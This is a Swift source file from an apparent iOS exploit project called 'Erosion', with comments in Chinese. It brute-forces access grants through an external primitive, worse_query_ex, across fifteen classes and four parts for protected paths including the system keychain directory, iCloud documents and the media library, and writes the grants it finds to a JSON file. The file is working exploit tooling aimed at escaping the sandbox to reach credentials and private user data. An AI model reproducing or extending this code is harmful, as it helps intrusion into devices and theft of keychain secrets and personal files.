//
//  GrantMatrix.swift
//  Erosion
//
//  精简版：只探最关键的 3 个路径，class 1-15 × part 1-4（alt=false），
//  每个目标跑完立刻落盘，避免整体卡死时一无所获。
//

import Foundation

enum GrantMatrix {
    static let targets = [
        "/private/var/Keychains",
        "/private/var/mobile/Library/Mobile Documents",
        "/private/var/mobile/Media"
    ]

    static func run(group: String) {
        let url = URL.documentsDirectory.appendingPathComponent("grant-matrix-result.json")
        var all: [[String: Any]] = []

        for target in targets {
            var granted: [[String: Any]] = []
            for queryClass in 1...15 {
                for part in 1...4 {
                    let handle = worse_query_ex(target, group, false, false, UInt64(queryClass), UInt64(part))
                    if handle >= 0 {
                        granted.append(["class": queryClass, "part": part, "handle": handle])
                        worse_query_release(handle)
                    }
                }
            }
            all.append(["target": target, "granted": granted])
            let payload: [String: Any] = [
                "at": ISO8601DateFormatter().string(from: Date()),
                "progress": all.count,
                "total": targets.count,
                "results": all
            ]
            if let data = try? JSONSerialization.data(withJSONObject: payload, options: [.prettyPrinted, .sortedKeys]) {
                try? data.write(to: url)
            }
            print("(grant-matrix) \(target) -> \(granted.count)/60 成功")
        }

        let final: [String: Any] = ["at": ISO8601DateFormatter().string(from: Date()), "done": true, "results": all]
        if let data = try? JSONSerialization.data(withJSONObject: final, options: [.prettyPrinted, .sortedKeys]) {
            try? data.write(to: url)
        }
        print("(grant-matrix) 完成")
    }
}
